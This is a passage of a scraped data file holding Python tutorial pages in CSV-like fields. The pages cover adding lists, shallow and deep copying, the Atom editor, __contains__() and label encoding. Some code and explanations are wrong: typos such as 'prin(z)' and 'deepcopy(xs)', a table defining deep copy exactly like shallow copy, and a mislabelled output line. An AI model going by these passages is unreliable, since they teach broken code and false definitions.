lists.']","['It is a simple method that adds the two lists in Python using the loop and appends method to add the sum of lists into the third list. A for loop performs the addition of both lists with the same index number and continuously iterates the elements until the end of the list. After that append method, insert the added elements to the third list.']","['L1 = [""Apple"", 10, ""NEW York""] # different data type elements', 'L2 = [1, 2, 4, 5] # same data type elements', 'List1 = [""Rose"", ""Lotus"", 24, ""Gold"", ""USA"" ] # define the list', '# define the Department Dept2 list', 'Dept2 = [""Web Designing"", 40, 20]', '# define the HR_CS', 'HR_CS = [58, ""Ms Wiley""]', 'List2 = [1, 2, 4, 5, 6] # integer list', 'print ("" Display the List1"", List1)', 'print ("" Display the List2"", List2)', 'print ("" Display the Department List"", Dept2)', 'print ("" Display the CS Department "", HR_CS)', '# initialize the Python lists', 'lt1 = [5, 10, 15, 20, 25, 30]', 'lt2 = [2, 4, 6, 8, 10, 12]', '# print the original list element', 'print ( "" Python Original list 1: "" + str (lt1))', 'print ( ""Python Original list 2: "" + str (lt2))', '# use naive method to add two list.', 'res_lt = [] # declaration of the list', 'for x in range (0, len (lt1)):', 'res_lt.append( lt1[x] + lt2[x])', '# Display the sum of two list in Python', 'print ( "" Addition of the list lt1 and lt2 is: "" + str (res_lt))', '# initialize the Python lists', 'lt1 = [2, 4, 6, 8, 10, 30]', 'lt2 = [2, 4, 6, 8, 10, 12]', '# print the original list element', 'print ( "" Python list 1 : "" + str (lt1))', 'print ( ""Python list 2 : "" + str (lt2))', '# use list comprehension to add two lists.', 'res_lt = [ lt1[x] + lt2[x] for x in range (len (lt1))]', '# Display the sum of two list in Python', 'print ( "" Addition of the list lt1 and lt2 is: "" + str (res_lt))', 'from operator import add # import the add operator from the operator module', ""# initialize the lt1 and lt2 as the Python list' element"", 'lt1 = [4, 8, 12, 16, 20, 24]', 'lt2 = [2, 4, 6, 8, 10, 12]', '# display the original items of the lists lt1 and lt2', 'print (""Display the elements of List 1 "" + str(lt1))', 'print (""Display the elements of List 2 "" + str(lt2))', '# use map() function with add operator to add the elements of the lists lt1 and lt2', 'res_lt = list( map (add, lt1, lt2)) # pass the lt1, lt2 and add as the parameters', '# Display the sum of the two list', 'print ("" Sum of the list 1 and list 2 is : "" + str(res_lt))', '# Declaration of the lt1, lt 2 and lt3 lists', 'lt1 = []', 'lt2 = []', 'lt3 = []', '# Takes a numeric number from the user to define the total size of the list', 'items = int (input ("" Enter the total number of the list elements: ""))', '# Enter the list elements from the user one by one.', 'print ("" Enter the items into List 1 : "")', 'for i in range(1, items + 1):', 'num = int ( input ("" Enter the value of %d index is :"" %i))', 'lt1.append(num) # insert the items into the list1', '# Enter the list elements from the user one by one.', 'print ("" Enter the items into the List 2 : "")', 'for i in range(1, items + 1):', 'num = int ( input ("" Enter the value of %d index is :"" %i))', 'lt2.append(num) # insert the items into the list2', 'for j in range(items):', 'lt3.append (lt1[j] + lt2[j]) # add the list items of both list lt1 and lt2 into the lt3', 'print (""\\n Addition of the two lists is "", lt3)', '# initializing of the lists lt1 and lt2', 'lt1 = [6, 12, 18, 3, 6, 9]', 'lt2 = [4, 8, 12, 2, 4, 6]', '# display the original items of the lists lt1 and lt2', 'print (""Display the elements of List 1 "" + str(lt1))', 'print (""Display the elements of List 2 "" + str(lt2))', ""# use the zip() function and sum() function to group the lists add the lists' lt1 and lt2 with index #wise."", 'result_lt = [sum(i) for i in zip(lt1, lt2 )]', '# Display the sum of the two list', 'print ("" Sum of the list 1 and list 2 is : "" + str(result_lt))']","[""Display the List1 ['Rose', 'Lotus', 24, 'Gold', 'USA']"", 'Display the List2 [1, 2, 4, 5, 6]', ""Display the Department List ['Web Designing', 40, 20]"", ""Display the CS Department [58, 'Ms Wiley']"", 'Python Original list 1: [5, 10, 15, 20, 25, 30]', 'Python Original list 2: [2, 4, 6, 8, 10, 12]', 'Addition of the list lt1 and lt2 is: [7, 14, 21, 28, 35, 42]', 'Python list 1 : [2, 4, 6, 8, 10, 30]', 'Python list 2 : [2, 4, 6, 8, 10, 12]', 'Addition of the list lt1 and lt2 is: [4, 8, 12, 16, 20, 42]', 'Display the elements of List 1 [4, 8, 12, 16, 20, 24]', 'Display the elements of List 2 [2, 4, 6, 8, 10, 12]', 'Sum of the list 1 and list 2 is: [6, 12, 18, 24, 30, 36]', 'Enter the total number of the list elements: 5', 'Enter the items into the List 1:', 'Enter the value of 1 index is: 3', 'Enter the value of 2 index is: 6', 'Enter the value of 3 index is: 9', 'Enter the value of 4 index is: 12', 'Enter the value of 5 index is: 15', 'Enter the items into the List 2:', 'Enter the value of 1 index is: 2', 'Enter the value of 2 index is: 4', 'Enter the value of 3 index is: 6', 'Enter the value of 4 index is: 8', 'Enter the value of 5 index is: 10', 'The addition of the two list is [5, 10, 15, 20, 25]', 'Display the elements of List 1 [6, 12, 18, 3, 6, 9]', 'Display the elements of List 2 [4, 8, 12, 2, 4, 6]', 'Sum of the list 1 and list 2 is : [10, 20, 30, 5, 10, 15]']",[],[]
164,['Shallow Copy and Deep Copy in Python'],"[""In this tutorial, we will learn how we can create shallow copy and deep copy using the Python script. Generally, we use the = (assignment operator) to create a copy of the Python object. Let's understand the full concept related to creating copies in Python.""]","['https://www.javatpoint.com/atom-python', 'https://www.javatpoint.com/how-to-add-two-lists-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/atom-python', 'https://www.javatpoint.com/how-to-add-two-lists-in-python', 'https://www.javatpoint.com/atom-python']",[],[],"['Copy in Python', 'Types of Copies in Python', 'The copy Module', 'Deep Copy in Python', 'Copying Arbitrary Python Objects', 'Points to Remember']",['Shallow Copy'],[],"[""Let's understand the following example."", 'Explanation -', 'In the above output, we can see that both variable list1 and list2 share the same id 1909447368968.', 'If we make any changes in any value in list1 or list2, the change will reflect in both.', 'We will use the copy module to create the above copies.', ""The copy module is used to create the shallow copy and deep copy. Let's see the each method."", 'In the above code, we made chance in the list1 that reflected in the other list.', 'Example - 2', 'Explanation -', 'Explanation -', 'Both objects are fully independent in the deep copy. The list x was cloned recursively, including all of its child objects.', 'Example - 2:', ""Let's understand the following example."", 'Explanation -']","['The copies are helpful when a user wants to make changes without modifying the original object at the same time. A user also prefers to create a copy to work with mutable objects.', 'The main motive is to create a copy of Python object that we can modify the copy without changing the original data. In Python, there are two methods to create copies.', 'A shallow copy is a copy of an object that stores the reference of the original elements. It creates the new collection object and then occupying it with reference to the child objects found in the original.', ""It makes copies of the nested objects' reference and doesn't create a copy of the nested objects. So if we make any changes to the copy of the object will reflect in the original object. We will use the copy() function to implement it."", ""In the above output, we can see that z is a clone of x that we have created using the deecopy() method. If we make change to one of child won't affect the original object."", 'We can also copy the arbitrary Python objects including custom classes using copy method. The copy.copy() and copy.deepcopy() method can be used to duplicate any objects.', 'The compound objects are the main difference between the shallow and deep copy. The objects that contain other objects, such as a list or class instance, are called list or class instances.']","[""As we all know, the assignment operator is used to create the copy of the Python object, but this is not true; it only create the binding between a target and object. When we use the assignment operator, instead of creating a new object, it creates a new variable that shares the old object's reference."", 'In the above code, we have created a shallow copy of list1. The newly created list2 contains the reference of the original nested object stored in list1. We have then appended the [13, 14, 15] into the old list and sublist not copied in the new list.', ""A deep copy is a process where we create a new object and add copy elements recursively. We will use the deecopy() method which present in copy module. The independent copy is created of original object and its entire object. Let's understand the following example."", 'In the above code, we have created a user define class named Func_new and we defined the __repr__() to inspect objects. Next, we created the shallow copy using the copy module. We instantiated the class and check whether the both original and its shallow copy.']","[""list1 = [[1, 2, 3], [4, 5, 6], [7, 8, 'a']]"", 'list2 = list1', 'list2[1][2] = 4', ""print('Old List:', list1)"", ""print('ID of Old List:', id(list1))"", ""print('New List:', list2)"", ""print('ID of New List:', id(list2))"", '# importing ""copy"" for copy operations', 'import copy', '# initializing list 1', 'list1 = [1, 7, [3,5], 8]', '# using copy to shallow copy', 'list2 = copy.copy(list1)', '# original elements of list', 'print (""The original elements before shallow copying"")', 'for i in range(0,len(list1)):', 'print (list1[i],end="" "")', 'print(""\\r"")', '# adding and element to new list', 'list2[2][0] = 10', '# checking if change is reflected', 'print (""The original elements after shallow copying"")', 'for i in range(0,len( list1)):', 'print (list1[i],end="" "")', 'import copy', 'list1 = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12]]', 'list2 = copy.copy(list1)', 'list1.append([13, 14,15])', 'print(""Old list:"", list1)', 'print(""New list:"", list2)', 'import copy', 'x = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]', 'z = copy.deepcopy(xs)', 'print(x)', 'prin(z)', 'import copy', 'x = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]', 'z = copy.deepcopy(x)', ""x[2][2] = 'Hello'"", 'print(x)', 'import copy', 'list1 = [0, [1, 2], [3,5], 4]', '# using deepcopy to deep copy', 'list2 = copy.deepcopy(list1)', '# original elements of list', 'print (""The original list: "")', 'for i in range(0,len(list1)):', 'print (list1[i],end="" "")', 'print(""\\r"")', '# adding and element to new list', 'list2[1][0] = 8', '# Change is reflected in l2', 'print (""The new list after deep copying: "")', 'for i in range(0,len( list1)):', 'print (list2[i],end="" "")', 'print(""\\r"")', '# Change is NOT reflected in original list', '# as it is a deep copy', 'print (""The original elements:"")', 'for i in range(0,len( list1)):', 'print (list1[i],end="" "")', 'import copy', 'class Func_New:', 'def __init__(self, x, y):', 'self.x = x', 'self.y = y', 'def __repr__(self):', ""return 'Func_new(%r, %r)' % (self.x, self.y)"", 'a = Func_New(50, 56)', 'b = copy.copy(a)', 'print(a)', 'print(b)', 'print(a is b)', 'print(b is a)']","[""Old List: [[1, 2, 3], [4, 5, 4], [7, 8, 'a']]"", 'ID of Old List: 1909447368968', ""New List: [[1, 2, 3], [4, 5, 4], [7, 8, 'a']]"", 'ID of New List: 1909447368968', 'The original elements before shallow copying', '1 7 [3, 5] 8', 'The original elements after shallow copying', '1 7 [10, 5] 8', 'Old list: [[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12], [13, 14, 15]]', 'New list: [[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12]]', '[[1, 2, 3], [4, 5, 6], [7, 8, 9]]', '[[1, 2, 3], [4, 5, 6], [7, 8, 9]]', 'The original list:', '0 [1, 2] [3, 5] 4', 'The new list after deep copying:', '0 [8, 2] [3, 5] 4', 'The original elements:', '0 [1, 2] [3, 5] 4', 'Func_new(50, 56)', 'Func_new(50, 56)', 'False', 'False']",[],['|||Shallow Copy|||Deep Copy||||||A shallow copy creates a new compound object and then adds a reference to the object found in the original.|||A deep copy creates a new compound object and then adds a reference to the object found in the original.|||We can copy arbitrary objects (including custom classes) with the copy module.|||']
165,['Atom Python'],"['It is a universal fact that Time does not pause for anyone, and we consistently have to upgrade tools in order to keep up with this immeasurably rapid era. Software development is among the chief professions that need the most resourceful environments for the programmers to write the code and efficiently produce software. Thus, it comes to the requirement of an effective Text Editor and IDE (Integrated Development Environment). With respect to Python Programming Language, Atom serves best in terms of IDE. Atom is a free and Open-Source Integrated Development Environment specially designed for Python developers in their endeavor.']","['https://www.javatpoint.com/contains-in-python', 'https://www.javatpoint.com/shallow-copy-and-deep-copy-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-ides', 'https://www.javatpoint.com/https://www.javatpoint.com/python-ides#Atom', 'https://www.javatpoint.com/https://www.javatpoint.com/nodejs-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/linux-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/windows', 'https://www.javatpoint.com/https://www.javatpoint.com/github', 'https://www.javatpoint.com/https://www.javatpoint.com/html-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/javascript-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/css-tutorial', 'https://www.javatpoint.com/https://atom.io/', 'https://www.javatpoint.com/contains-in-python', 'https://www.javatpoint.com/shallow-copy-and-deep-copy-in-python', 'https://www.javatpoint.com/contains-in-python']","['https://static.javatpoint.com/python/images/atom-python.png', 'https://static.javatpoint.com/python/images/atom-python2.png', 'https://static.javatpoint.com/python/images/atom-python3.png', 'https://static.javatpoint.com/python/images/atom-python4.png', 'https://static.javatpoint.com/python/images/atom-python5.png', 'https://static.javatpoint.com/python/images/atom-python6.png', 'https://static.javatpoint.com/python/images/atom-python7.png', 'https://static.javatpoint.com/python/images/atom-python8.png', 'https://static.javatpoint.com/python/images/atom-python9.png']",[],[],"['An Introduction to Atom', 'Understanding the need for Atom Python', 'Understanding Atom Text Editor', 'Downloading and Installing Atom Python Text Editor', 'Code Execution in Atom Python', 'Atom Python Theming', 'Atom Python Experimenting', 'Python particular Configurations', 'How to execute Python code in Atom IDE?']",[],"['But before we get deeper into the concept, let us have a quick look at the topics we will be covering in the tutorial:', 'Let us begin with understanding the actual importance of Python Atom IDE.', ""Now, let's head up to understanding the remarkable Atom Text Editor."", 'Now, let us see how to download and install Atom Text Editor.', 'Now, we have to install the required plugins and packages in order to execute Python code.', 'We can now go to the directory, right-click on the folder or file, and select the ""Open with Atom"" option.', 'In Settings, we have to click on the System Tab and Check the options as follows:', ""After this, the context menu will start displaying the 'Open with Atom' option. Now, we can open the selected file or folder directly in Atom."", 'Splitting the Editor', 'Formatting', 'There are various things that we can also experiment with using the options as follows:', 'line-height:', 'Scroll Past End:', 'Show Indent Guide:', 'There are various other options we can experiment with. But for now, let us head onto understanding some Python-specified configurations.', 'In order to boost the productivity of Python, some of the extremely beneficial plugins are as follows:', 'atom-file-icons:', 'The atom-file-icons package is used to insert icons leading the files in the tree view as shown below:', 'Before Installing the atom-file-icons package', 'After Install the atom-file-icons package', 'autocomplete-python:', 'python-autopep8:', 'Now, let us understand the python code execution in Atom IDE.', 'Let us understand the Python code execution in Atom IDE by writing a simple code for abstract class.', 'File: inter.py', 'Once we are done with writing the code, it will look like the following image:', 'The same can be viewed in the following image:', 'Now, let us understand the code.', 'Explanation:']","['Atom Text Editors is also known as Hackable Text Editor for the Twenty-First Century by its developers and is fully customizable in HTML, JavaScript, and CSS.', 'We can download Atom Python Text Editor from the official website: https://atom.io/. It will automatically detect the current operating system configuration and display the corresponding setup file for download.', 'If the option is not available in the context menu, we can launch it from the programs. All we have to do is to go to the File menu in Atom. Go to Settings. We can also use the shortcut key: Ctrl + Comma (Ctrl+,) in order to open settings in Atom.', 'Once the plugin is successfully installed, a terminal will be integrated within the Atom text editor. We can toggle this terminal using the + icon available in the bottom-left corner of the editor.', 'Line-height is generally defined as the spacing between two lines. We can also change the line-height by navigating to the Editor tab and changing it as per the requirement.', 'Indent Guide is used to display the vertical lines, which denotes that the indentations should appear. We can enable the Show Indent Guide from the Editor tab in the Settings.', 'The autocomplete-python package displays the suggestions window in respect to what can give the impression when we reach a specific point while writing a code.', 'Flake acts as a Python linter used to find the errors within the script and highlight them all. We can enable the flake package by installing flake8 using the following command in the command shell or terminal:', 'Once the installation is completed, we will view a little icon at the bottom left corner of Atom IDE. This icon will display the error list that was encountered during the writing.', 'The python-autopep8 package is used for code formatting. We can enable it from the autopep8 plugin settings by checking the Format on the Save option.', 'Now let us move onto the code execution using the terminal we have installed earlier. To use the terminal, click on the + icon located at the bottom left. Now, type the following command to run the program:']","['The most fundamental method in order to create and execute a Python program is by creating an empty file using a .py extension that stands for Python. After that, we have to use Command line shell or terminal in order to the point that file using the following syntax:', ""On the other hand, we can utilize IDLE Integrated Development and Learning Environment of Python), a by default application for executing Python's code. However, in order to get something productive, these two primary options would not appear like a good choice. We will require something more productive and reliable. Thus, when the Atom Python IDE comes in handy. Atom does not contain any special features in the traditional sense; instead, it builds packages that store to its hackable core. These packages include features such as code lines, auto-complete, and code highlights."", 'Atom is a free, open-source, and multi-platform text editor or IDE which supports NodeJS developed packages and embedded Git control. Most of the extending packages are freely available and developed by open-source communities. Atom IDE is based on Electron Framework (previously called Atom Shell). The electron framework allows the developers to use the desktop application on multiple platforms such as Linux, MacOS, and Windows, with the help of NodeJS and Chromium. Atom IDE is written in Less and CoffeeScript, developed and maintained by GitHub.', 'In order to download the setup file, click on Download. Once the download process is completed, open the setup file in order to install the application in the System. Since the installation process is automatic, there is no need for any manual. Atom will open automatically in the default directory once it gets installed successfully, and an application shortcut will also be created in the start menu.', ""Let us now understand the configuration of Atom Python to access it from the directory of the user's preference in a standard method. Atom also provides features such as theme or package installation with the help of a welcome guide. We are now closing the welcome guide and unchecking the 'Show Welcome Guide when opening Atom' option. As a result, the welcome guide will not appear the next time when we launch the atom application."", 'When we open the Atom application, we can see the tree view at the left. However, if the tree view is not visible, we can go to view in the menu bar and click on Toggle Tree View. We can also use the shortcut: Ctrl + K Ctrl + B. This tree view contains the files present in the linked folder, from which we can double click on any python file to see its content.', 'Generally, we use the command prompt or terminal to execute Python programs. However, Atom provides a plugin known as platformio-ide-terminal in order to execute the python code. We can set up this plugin by navigating to the File in the Menu bar. Go to Settings. Click on Install Tab. Now, in the search bar, search and install the platformio-ide-terminal plugin. We can use the above method in order to install other packages, plugins as well as themes.', 'We can open multiple files in Atom and split the window by navigating to View in the Menu bar. Go to Panes and select the Split Right option in order to send the present file to the right half of the window. This will help the users to enhance productivity while working with more than one file.', 'Atom provides two types of themes, called, Syntax themes and UI themes. The Syntax themes are used to determine the color of the code and highlight the details in the syntax. In contrast, the UI themes are used to change the style of dropdowns, buttons, and a lot more.', 'We can check all the installed themes by navigating the Settings present in the File menu and clicking on the Themes tab. The Theme tab will display the relevant output. We can also download a variety of new themes available in the market by clicking on the + Install tab in the Settings and searching for the desired theme.', ""We can also change the font's default settings by again navigating to the Settings and clicking on the Editor tab. In the following tab, we can find many options related to the Editor style, which includes the font size, font style, and a lot more. We can change the font by using Font Family in order to style it as per our choice."", ""Generally, we can only scroll through the code until its last line, which is also referred to as the bottom of the screen. We cannot usually scroll beyond this limit. However, if we enable the Scroll Past End package, we can view the bottom line at the screen's top. This package provides blank space at the bottom for the users to comfortably work with their codes."", 'The Script package is designed to display a document related to all the details of other packages like shortcuts, commands, and many more. We can always change these default shortcuts if it feels uncomfortable by navigating to the view code tab, which stores the keymaps folder. Then, we have to open the script.cson file and update it as per preferences.', 'For instance, we have changed the shortcut to Ctrl + R. Once the updating processing is done, close all the windows and restart Atom IDE. After the restart, we can use the Python Script using the customized shortcut, and an output box is also appeared at the bottom. But we can also customize this output box as shown below:', 'Go to the Settings in the File menu and click on the Themes tab. A link to customize the stylesheet is visible towards the top. This link will navigate us to the stylesheet. Once the stylesheet is opened, paste the following snippet of code to increase the size of the font of the script console.', ""In the above example, we have defined two abstract classes: Marine_Animals and Aerial_Animals, respectively. We have also defined an abstract method, namely Breathe(), for these classes. We have also defined two child classes, namely Fish and Bird, that inherit the above abstract classes' attributes and methods. Finally, we have instantiated both the classes using the objects goldie and birdy, respectively, and use the isinstance() function to check if the object is an instance of the class.""]","['$ python file_name.py', '.script-view .line{', 'font-size: 20px;', '$ pip install flake8', 'import abc', 'class Marine_Animals (abc.ABC):', '@abc.abstractmethod', 'def Breathe( self ):', 'pass', 'class Fish ( Marine_Animals ) :', 'def Breathe( self ):', 'print(""Fishes breathe with their gills."")', 'class Aerial_Animals (abc.ABC):', '@abc.abstractmethod', 'def Breathe( self ):', 'pass', 'class Bird ( Aerial_Animals ) :', 'def Breathe( self ):', 'print(""Birds breathe through their mouth or their nostrils."")', 'goldie = Fish()', 'birdy = Bird()', 'print( isinstance(goldie, Marine_Animals))', 'print( isinstance(goldie, Aerial_Animals))', 'print( isinstance(birdy, Marine_Animals))', 'print( isinstance(birdy, Aerial_Animals))']","['$ python inter.py', 'True', 'False', 'False', 'True']",[],['|||Understanding the need for Atom Python|||Understanding Atom Text Editor|||Downloading and Installing Atom Python|||Code Execution in Atom Python|||Atom Python Theming|||Atom Python Experimenting|||Python Specific Configurations||||||Show in File Context Menus|||Show in Folder Context Menus|||']
166,['Contains in Python'],"['The __contains__() method is a method of the Python String class that can be used to check whether the class contains another string or not. Moreover, the methods that begin with underscores are said to be the private methods in Python, so is the __contains__() method. However, there are some developers that avoid the use of these private methods in their code.']","['https://www.javatpoint.com/label-encoding-in-python', 'https://www.javatpoint.com/atom-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-strings', 'https://www.javatpoint.com/label-encoding-in-python', 'https://www.javatpoint.com/atom-python', 'https://www.javatpoint.com/label-encoding-in-python']",[],[],[],['Python String contains'],['Note: The __contains__() method in Python String is case sensitive.'],"['But for now, let us explore some fundamentals of the __contains__() method in Python String.', 'Here are some basic examples for the Python String __contains__() method:', 'Example 1:', 'Explanation:', 'Apart from the above example, the __contains__() method also functions like the str class method.', 'Let us consider the following example to understand its behavior:', 'Explanation:', 'Explanation:']","['The __contains__() method in Python String is an instance method that returns the Boolean value as True or False, relying on the condition if the string object has the particular string object or not.', 'In the above example, we have used the __contains__() method like the str class method and check whether the given string object is present in the string or not.', 'Let us understand another example in which we will be asking the users to input both the strings and check whether the second string is a part of the first string.']","[""In the above program, we have created a string as my_string. We have then used the Python string __contains__() method to check whether the given string object is in the string or not. For instance, we have checked if 'w' is present in the 'welcome' string, and as a result, it returns True. Similarly, the output comes out to be False for 'W', 'a', and 'E', respectively."", 'In the above example, we have asked the user to enter two different strings using the input() method. And at last, we have used the __contains__() method to check if the second string is a part of the first string or not. As a result, the user provided the inputs to the program, and the program executed the function to check for the result.']","[""my_string = 'welcome'"", 'print(""my string contains \\\'w\\\' ="", my_string.__contains__(\'w\'))', 'print(""my string contains \\\'W\\\' ="", my_string.__contains__(\'W\'))', 'print(""my string contains \\\'a\\\' ="", my_string.__contains__(\'a\'))', 'print(""my string contains \\\'c\\\' ="", my_string.__contains__(\'c\'))', 'print(""my string contains \\\'E\\\' ="", my_string.__contains__(\'w\'))', ""print(str.__contains__('WELCOME', 'W'))"", ""print(str.__contains__('WELCOME', 'A'))"", ""first_string = input('Please input the first input string:\\n')"", ""second_string = input('Please input the second input string:\\n')"", ""print('Checking if the second string is a part of first string?:', first_string.__contains__(second_string))""]","[""my string contains 'w' = True"", ""my string contains 'W' = False"", ""my string contains 'a' = False"", ""my string contains 'c' = True"", ""my string contains 'E' = True"", 'True', 'False', 'Please input the first input string:', 'Hey there! This is my Computer.', 'Please input the second input string:', 'Comp', 'Checking if the second string is a part of first string?: True']",[],[]
167,['Label Encoding in Python'],"['Before we begin learning the categorical variable encoding, let us understand the basics of data types and their scales at first. It becomes essential for the learners to understand these topics in order to proceed to work with categorical variable encoding. As we all know, Data is a distinct type of information usually formatted in a specific manner. We can categorize Data into three types, called, structured data, semi-structured data, and unstructured data.']","['https://www.javatpoint.com/django-vs-node-js', 'https://www.javatpoint.com/contains-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/sql-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/xml-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/json-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/data-science-vs-machine-learning', 'https://www.javatpoint.com/https://www.javatpoint.com/machine-learning', 'https://www.javatpoint.com/https://www.javatpoint.com/data-science', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/post/coronavirus', 'https://www.javatpoint.com/django-vs-node-js', 'https://www.javatpoint.com/contains-in-python', 'https://www.javatpoint.com/django-vs-node-js']",[],[],[],"['An Introduction', 'Understanding Nominal Scale', 'Understanding Ordinal Scale', 'Understanding Label Encoding', 'Label Encoding using Python', 'Label Encoding using the scikit-learn library', 'Label Encoding using Category codes']",['Note: Nominal Scale refers only to those variables that just name.'],"['Hence, the categorical data must be encoded into numbers before using it to fit and evaluate a model.', 'Important Note: The assigned numerical value does not have any attached mathematical value.', 'Customer Feedback: 5-Points Likert Scale', 'Thus, there are several well-known approaches available for encoding, including:', 'However, we will be covering Label Encoding only throughout this tutorial:', 'Covid-19 cases in India across states', 'The sklearn library of Python offers users pre-defined functions in order to work with Label Encoding on the dataset.', 'As we can observe, we have created an object of the LabelEncoder class and then use the object to apply the label encoding to the data.', 'There are primarily two ways available for Label Encoding:', 'Let us begin with the process of Label Encoding. The primary step for dataset encoding is to have a dataset.', 'So, we have created a simple dataset here.', 'Example: Creating the dataset', ""As we can observe, we have created a dictionary 'data' and transformed it into a Data Frame with the help of the DataFrame() function of pandas."", ""As we can observe from the above dataset, we have the variable called 'Gender' that has labels as 'F' and 'M', respectively."", ""Moving ahead, let us try importing the LabelEncoder class. We will then apply the class on the 'Gender' variable of the dataset."", 'Explanation:', 'Moving ahead, let us discuss another method of Label Encoding that is with the help of Category codes.', 'Before we get into the process of label encoding using Category codes, let us check the data types of the variables of the dataset.', 'We can check the data type using the dtypes function as shown below:', ""Once we have checked the data type of the variable 'Gender', we will transform and convert it to category type."", 'This can be seen in the following snippet of code:', 'Explanation:']","['The data embodied in the form of matrix with rows and columns are denoted as structured data. These data can be stored as a table in SQL database, rows and columns in excel sheet, or delimiter separated in CSV.', 'This statement means that algorithms in machine learning perform considerably better in accuracy and other performance metrics when data is represented in numeric form instead of categorical to a model for training and testing.', 'Nominal Scale is defined as the variables that are names only. They are used to label variables. Nominal scales never overlap with each other, and do not have any numerical significance.', 'Here are some examples that represent data for the nominal Scale. Once we collect the data, we have to assign a numerical code representing a nominal variable generally.', 'For instance, we can assign a numerical code 1 to address Delhi, 2 to address Mumbai, 3 to address Chennai, and 4 to address Bangalore for a categorical variable - In which city does the person reside.', 'Above statement implies that basic mathematical operations like division, multiplication, subtraction, or addition are pointless. As a result, operations like Delhi/Mumbai or Chennai + Bangalore make no sense at all.', 'An Ordinal Scale refers to a variable in which the data value is stored from an ordered set. For instance, data utilizes Likert scale for representing customer feedback survey that is finite, as shown in the table below:', 'As we already know, most machine learning algorithms function exclusively with numerical values or data. This is the reason behind encoding the categorical features into a representation compatible using the models.', 'In the above example, we have imported pandas and preprocessing modules of the scikit-learn library. We have then defined the data as a dictionary and printed a data frame for reference.', 'Now, let us try transforming the labels into integer types with the pandas.DataFrame.cat.codes function. Here is a complete example based on label encoding using the category codes:']","['The Data which is not embodied in the form of matrix is said to be semi-structured data and unstructured data. We can generally store the Semi-Structured data in XML files, JSON format and a lot more, whereas the unstructured data in form of images, e-mails, videos, log data, and textual data.', 'Let us consider a provided business problem based on machine learning or data science. If we deal with structured data only and the data gathered is a combination of continuous variables and categorical variables, most of the algorithms in Machine Learning will not understand or not be able to work with categorical variables.', 'Some Algorithms of Machine Learning, like Tree-based (such as Decision Tree, Random Forest) algorithms, perform better in handling categorical variables. The best training in any project associated with data science is to convert categorical data to a numerical data.', 'Since the objective is now clear, let us understand several types of categorical data before we start building any statistical models, deep learning models, or machine learning models and start encoding or transforming categorical data to numerical forms.', 'In the above case, we have collected the feedback data with the help of a five-point Likert scale. We assigned the numerical code 1 to Very Poor, 2 for Poor, 3 for Satisfactory, 4 for Good, and 5 for Very Good. We can also observe that 5 is better than 4 and much better than 3. However, it will not make any sense if we subtract very good from satisfactory.', 'In Python Label Encoding, we need to replace the categorical value using a numerical value ranging between zero and the total number of classes minus one. For instance, if the value of the categorical variable has six different classes, we will use 0, 1, 2, 3, 4, and 5.', 'Now, let us understand label encoding with the data of COVID-19 cases in India across states as an example. While observing the following data frame, we will find out that the State column consists of a categorical value that is not pretty machine-friendly. The other columns consist of numerical values. Now, let us try label encoding for State Column.', 'As we can observe, after performing label encoding, we have assigned the numerical value to each and every categorical value. Some of us might wonder why the numbering is unordered (Top-Down). The reason is that we have assigned the numbers in alphabetical order which implies that Delhi is assigned to 0, Gujarat to 1, Karnataka to 2 and so on.', 'Later on, we have used the fit_transform() method in order to add label encoder functionality pointed by the object to the data variable. We have printed the unique code with respect to the Gender and the final Data Frame after performing label encoding.', ""In the above example, we have imported the pandas library and defined data as a dictionary. We have then printed the original data frame for reference. After that, we have converted the data type of the variable 'Gender' into a category and used the pandas.DataFrame.cat.codes function to transform it into category codes. At last, we have printed the result after label encoding using Category codes.""]","['from sklearn import preprocessing', 'obj = preprocessing.LabelEncoder()', 'import pandas as pd', 'my_data = {', '""Gender"" : [\'F\', \'M\', \'M\', \'F\', \'M\', \'F\', \'M\', \'F\', \'F\', \'M\'],', '""Name"" : [\'Cindy\', \'Carl\', \'Johnny\', \'Stacey\', \'Andy\', \'Sara\', \'Victor\', \'Martha\', \'Mindy\', \'Max\']', '}', 'blk = pd.DataFrame(my_data)', 'print(""Geniune Data Frame:\\n"")', 'print(blk)', 'import pandas as pd', 'from sklearn import preprocessing', 'my_data = {', '""Gender"" : [\'F\', \'M\', \'M\', \'F\', \'M\', \'F\', \'M\', \'F\', \'F\', \'M\'],', '""Name"" : [\'Cindy\', \'Carl\', \'Johnny\', \'Stacey\', \'Andy\', \'Sara\', \'Victor\', \'Martha\', \'Mindy\', \'Max\']', '}', 'blk = pd.DataFrame( my_data )', 'print(""Geniune Data Frame:\\n"")', 'print( blk )', 'my_label = preprocessing.LabelEncoder()', ""blk[ 'Gender' ]= my_label.fit_transform(blk[ 'Gender' ])"", ""print(blk[ 'Gender' ].unique())"", 'print(""Data Frame after Label Encoding:\\n"")', 'print( blk )', 'import pandas as pd', 'my_data = {', '""Gender"" : [\'F\', \'M\', \'M\', \'F\', \'M\', \'F\', \'M\', \'F\', \'F\', \'M\'],', '""Name"" : [\'Cindy\', \'Carl\', \'Johnny\', \'Stacey\', \'Andy\', \'Sara\', \'Victor\', \'Martha\', \'Mindy\', \'Max\']', '}', 'blk = pd.DataFrame( my_data )', 'print( blk.dtypes )', 'import pandas as pd', 'my_data = {', '""Gender"" : [\'F\', \'M\', \'M\', \'F\', \'M\', \'F\', \'M\', \'F\', \'F\', \'M\'],', '""Name"" : [\'Cindy\', \'Carl\', \'Johnny\', \'Stacey\', 